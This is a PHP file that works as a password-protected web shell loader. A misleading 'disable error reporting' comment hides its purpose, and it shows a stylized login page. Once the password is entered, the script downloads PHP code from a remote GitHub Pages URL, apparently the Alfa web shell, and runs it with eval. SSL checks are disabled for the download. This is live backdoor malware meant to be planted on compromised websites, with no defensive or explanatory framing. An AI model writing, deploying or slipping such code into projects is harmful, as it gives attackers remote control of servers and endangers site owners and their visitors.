<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '37bd8d4f5adc469f75bdc73b2f8edccc'; // Replace this with your MD5 hashed password
    if (md5($entered_password) === $hashed_password) {
        // Password is correct, store it in session
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
    } else {
        // Password is incorrect
        echo "Incorrect password. Please try again.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://xinz769.github.io/mcb/769/alfa-lao.txt');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Xinz769</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      font-family: 'Poppins', sans-serif;
      background-image: url("https://xinztheonly.one/img/begee.jpg");
      background-position: center center;
      background-attachment: fixed;
      background-repeat: no-repeat;
      background-size: cover;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .login-box {
      background: transparent;
      border-radius: 12px;
      padding: 40px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
      text-align: center;
    }

    .header-image {
      margin-bottom: -20px;
    }

    .header-image img {
      max-width: 300px;
      height: auto;
    }

    .form-group {
      margin-bottom: 20px;
      text-align: center;
    }

    .form-group label {
      display: block;
      margin-bottom: 6px;
      font-weight: 500;
      color: #fff;
    }

    .form-group input {
      width: 50%;
      padding: 5px 5px;
      border: 1px solid #ddd;
      border-radius: 8px;
      outline: none;
      font-size: 16px;
    }

    .form-group input:focus {
      border-color: #667eea;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <div class="header-image">
        <img src="https://xinztheonly.one/img/darkartt.png" alt="Logo">
      </div>
      <form method="post" action="">
        <div class="form-group">
          <label for="password">YANG KERJA KERJA AJA</label>
          <input type="password" id="password" name="password" required>
        </div>
      </form>
    </div>
  </div>
</body>
</html>
    <?php
}
?>